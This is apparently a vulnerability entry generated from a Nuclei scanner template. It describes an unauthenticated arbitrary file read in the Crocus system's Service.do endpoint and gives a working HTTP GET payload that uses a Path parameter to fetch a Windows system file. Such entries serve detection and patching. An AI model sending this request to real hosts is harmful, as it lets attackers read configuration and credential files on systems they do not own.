# Vulnerability: Crocus system Service.do - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`crocus-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology's Crocus system. An unauthenticated remote attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc. This leaves the website in an extremely unsafe state.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
```

